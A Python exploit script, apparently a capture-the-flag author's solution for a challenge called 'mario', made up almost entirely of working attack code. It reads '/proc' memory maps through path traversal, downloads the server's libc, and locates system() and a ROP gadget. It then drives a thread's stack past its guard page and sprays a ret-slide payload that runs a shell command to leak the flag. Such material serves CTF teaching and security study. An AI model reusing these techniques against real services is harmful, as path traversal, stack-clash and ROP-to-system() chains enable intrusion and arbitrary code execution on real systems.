#!/usr/bin/env python3

import socket
import struct
import time
import sys
import subprocess

# exploit for "mario" by TheJH (challenge author)

TCP_IP = sys.argv[1]
TCP_PORT = int(sys.argv[2])

BUFFERCLOG_CHUNK_COUNT = 16000 # should be divisible by BUFFERCLOG_CHUNK_SIZE
BUFFERCLOG_CHUNK_SIZE = 500 # choose this to be below your MTU, but not too much
BUFFERCLOG_INTERVAL_FAST = 0.001
BUFFERCLOG_INTERVAL_SLOW = 0.1
SPRAY_SIZE = 8000000

COMMAND_LAUNCH_SERVICE = bytes([20])
COMMAND_ACCESS_SERVICE = bytes([14])
SERVICE_TYPE_PROFILE_VIEWER = bytes([0])
SERVICE_TYPE_SORTER = bytes([1])

def open_tcp_connection():
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((TCP_IP, TCP_PORT))
  # tell the kernel not to merge packets
  s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, True)
  return s

def launch_service(type):
  s = open_tcp_connection()
  s.send(COMMAND_LAUNCH_SERVICE+type)
  f = s.makefile()
  service_id = f.readline().strip()
  #print('got service ID "{0}"'.format(service_id))
  return service_id

def connect_to_service(service_id):
  s = open_tcp_connection()
  s.send(COMMAND_ACCESS_SERVICE)
  s.send(bytes(service_id+'\n', 'utf-8'))
  return s

def get_profile(name):
  s = connect_to_service(launch_service(SERVICE_TYPE_PROFILE_VIEWER))
  f = s.makefile('w')
  f.write(name+'\n')
  f.flush()
  return s.makefile('r').read()

def get_service_maps(service_id):
  pid = service_id.split('/')[1]
  # that should be enough slashes, right?
  maps_str = get_profile('../../../../../../../../../../../../proc/{0}/maps'.format(pid))
  return maps_str

def get_stack_pointer(tid):
  return int(get_profile('../../../../../../../../../../../../proc/{0}/stat'.format(tid)).split(' ')[28])

victim_stack_start = None
rsp_diff_1 = None

def remaining_stackframes(victim_tid):
  victim_rsp = get_stack_pointer(victim_tid)
  stack_left = victim_rsp - victim_stack_start
  stack_left -= 1000 # leave some room
  # every buffer-clogging chunk is one frame, too
  return stack_left // rsp_diff_1

if __name__ == "__main__":
  victim_service = launch_service(SERVICE_TYPE_SORTER)
  sprayer_connection = connect_to_service(victim_service)
  time.sleep(0.2)
  victim_connection = connect_to_service(victim_service)
  time.sleep(0.2)
  sprayer_connection.send(struct.pack('>I', SPRAY_SIZE))
  time.sleep(1)

  # this is what part of the memory of the service process looks like now:
  #   7fac9f07e000-7fac9f820000 rw-p 00000000 00:00 0  sprayer target area
  #   7fac9f820000-7fac9f821000 ---p 00000000 00:00 0  victim thread guard page (the one we want to jump)
  #   7fac9f821000-7faca0021000 rw-p 00000000 00:00 0  victim thread stack
  #   7faca0021000-7faca0022000 ---p 00000000 00:00 0  sprayer thread guard page (irrelevant)
  #   7faca0022000-7faca0822000 rw-p 00000000 00:00 0  sprayer thread stack
  service_maps = get_service_maps(victim_service)
  print(service_maps)
  stack_lineidx = service_maps.split('[stack:')[0].count('\n')
  libc_lineidx = service_maps.split('/libc')[0].count('\n')
  service_maps = service_maps.split('\n')
  victim_stack_line = service_maps[stack_lineidx]
  victim_tid = victim_stack_line.split(':')[2].split(']')[0]
  victim_stack_start = int(victim_stack_line.split('-')[0], 16)
  heap_line = service_maps[stack_lineidx-2]
  heap_start = int(heap_line.split('-')[0], 16)
  libc_line = service_maps[libc_lineidx]
  libc_start = int(libc_line.split('-')[0], 16)
  print('victim tid: {}'.format(victim_tid))

  # download libc
  libc_path = '../../../../../../../../../../../../' + libc_line.split('/', 1)[1]
  libc_s = connect_to_service(launch_service(SERVICE_TYPE_PROFILE_VIEWER))
  libc_f = libc_s.makefile('w')
  libc_f.write(libc_path+'\n')
  libc_f.flush()
  libc_data = libc_s.makefile('rb').read()
  libc_out = open('server_libc.so', 'wb')
  libc_out.write(libc_data)
  libc_out.close()

  # find system()
  system_offset = int(subprocess.check_output("objdump -T server_libc.so | grep ' system$' | cut -d' ' -f1", shell=True), 16)
  print('system() is at {0}'.format(hex(system_offset)))

  # find "pop rdi; ret" rop gadget (machine code: \x5f\xc3) in libc
  gadget_offset = libc_data.index(b'\x5f\xc3')
  print('ROP gadget is at {0}'.format(hex(gadget_offset)))

  # determine stackframe size
  victim_rsp_1 = get_stack_pointer(victim_tid)
  victim_connection.send(b'\xff')
  time.sleep(0.2)
  victim_rsp_2 = get_stack_pointer(victim_tid)
  victim_connection.send(b'\xff')
  time.sleep(0.2)
  victim_rsp_3 = get_stack_pointer(victim_tid)
  victim_connection.send(b'\xff')
  time.sleep(0.2)
  rsp_diff_1 = victim_rsp_1 - victim_rsp_2
  rsp_diff_2 = victim_rsp_2 - victim_rsp_3
  print('stack frame sizes (should be equal): {0}, {1}'.format(rsp_diff_1, rsp_diff_2))
  assert rsp_diff_1 == rsp_diff_2

  # fill up remaining victim stack, bring it close to the guard page
  # every buffer-clogging chunk is one frame, too
  frames_left = remaining_stackframes(victim_tid) - BUFFERCLOG_CHUNK_COUNT
  print('remaining stack space: {0} frames'.format(frames_left))
  for i in range(0, frames_left):
    victim_connection.send(b'\xff')
  time.sleep(2)
  remaining_space = get_stack_pointer(victim_tid) - victim_stack_start
  print('remaining space: {0}'.format(remaining_space))

  # make the victim thread jump the guard page, clog the network buffers,
  # make the victim thread block on write() while the stack is still beyond
  # the guard page.
  # first, skip ahead fast.
  victim_connection.send(struct.pack('>I', BUFFERCLOG_CHUNK_COUNT * BUFFERCLOG_CHUNK_SIZE))
  for i in range(0, BUFFERCLOG_CHUNK_COUNT - BUFFERCLOG_CHUNK_COUNT//BUFFERCLOG_CHUNK_SIZE):
    print('\rclogging... {0}/{1}'.format(i, BUFFERCLOG_CHUNK_COUNT), end="")
    victim_connection.send(b'a' * BUFFERCLOG_CHUNK_SIZE)
    time.sleep(BUFFERCLOG_INTERVAL_FAST)
  print('')
  time.sleep(3)

  # now slowly do the precision work.
  frames_to_fill = remaining_stackframes(victim_tid)
  bytes_to_send = (BUFFERCLOG_CHUNK_COUNT//BUFFERCLOG_CHUNK_SIZE) * BUFFERCLOG_CHUNK_SIZE
  print('precision clogging now. still got {0} stackframes to fill and {1} bytes to send.'.format(frames_to_fill, bytes_to_send))
  # assert frames_to_fill * BUFFERCLOG_CHUNK_SIZE >= bytes_to_send
  assert frames_to_fill <= bytes_to_send
  # try to make frames_to_fill == bytes_to_send
  while frames_to_fill < bytes_to_send:
    packet_size = min(bytes_to_send-frames_to_fill+1, BUFFERCLOG_CHUNK_SIZE)
    print('prec clogging big... bytes={0}, frames={1}      '.format(bytes_to_send, frames_to_fill))
    victim_connection.send(b'a' * packet_size)
    frames_to_fill -= 1
    bytes_to_send -= packet_size
    time.sleep(BUFFERCLOG_INTERVAL_SLOW)
  # and now fill the remaining frames, one byte per frame
  while frames_to_fill > 0:
    print('prec clogging small... remaining={0}            '.format(frames_to_fill))
    victim_connection.send(b'a')
    frames_to_fill -= 1
    bytes_to_send -= 1
    time.sleep(BUFFERCLOG_INTERVAL_SLOW)
  time.sleep(2)

  remaining_space = get_stack_pointer(victim_tid) - victim_stack_start
  print('remaining space (should be negative now): {0}'.format(remaining_space))
  assert remaining_space < 0

  # the victim stack pointer now points into the area that we allocated over the other connection.
  # now overwrite the stack
  # padding is against malloc overhead
  command_padding = b'#' * 128
  command = b'\necho "EXPLOITED" >&2; echo -n "#" >&5; ./getflag >&5; echo -n "#" >&5\0'
  head = command_padding + command
  head = head + b'X' * (16 - len(head) % 16)

  gadget_addr = struct.pack('<Q', libc_start + gadget_offset)
  command_addr = struct.pack('<Q', heap_start+128)
  system_addr = libc_start + system_offset
  print('system addr: {0}'.format(hex(system_addr)))
  system_addr = struct.pack('<Q', system_addr)
  tail = gadget_addr + command_addr + system_addr

  # ret slide ftw!
  ret_addr = struct.pack('<Q', libc_start + gadget_offset + 1)
  middle_len = SPRAY_SIZE - len(head) - len(tail) - 8
  middle = ret_addr * (middle_len // 8)
  complete_overwrite_buffer = head + middle + tail
  sprayer_connection.send(complete_overwrite_buffer)

  inbytes = 0
  flag = ''
  while True:
    buf = victim_connection.recv(1)
    if len(buf) == 0:
      print('peer died too early (after {0})'.format(inbytes))
      sys.exit(1)
    inbytes += 1
    if buf[0] == ord('#'):
      print('got '+chr(buf[0]))
      break
  while True:
    buf = victim_connection.recv(1)
    if len(buf) == 0 or buf[0] == ord('#'):
      break
    flag += chr(buf[0])
  print('flag: {0}'.format(flag))
